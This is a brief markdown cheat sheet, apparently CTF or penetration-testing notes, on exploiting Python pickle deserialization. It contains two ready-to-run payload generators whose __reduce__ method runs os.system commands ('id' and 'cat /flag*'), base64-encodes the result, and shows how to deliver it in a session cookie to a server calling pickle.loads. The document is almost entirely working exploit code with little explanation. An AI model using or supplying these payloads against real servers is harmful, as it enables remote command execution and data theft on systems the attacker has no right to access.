# Deserialization

## Python Pickle RCE

Use when a cookie/body/session is base64 pickle and server loads it with `pickle.loads`.

```python
import base64
import os
import pickle

class R:
    def __reduce__(self):
        return (os.system, ("id",))

print(base64.b64encode(pickle.dumps(R())).decode())
```

```http
Cookie: session=BASE64_PICKLE
```

## Pickle Read Flag

```python
import base64
import os
import pickle

class R:
    def __reduce__(self):
        return (os.system, ("cat /flag*",))

print(base64.b64encode(pickle.dumps(R())).decode())
```
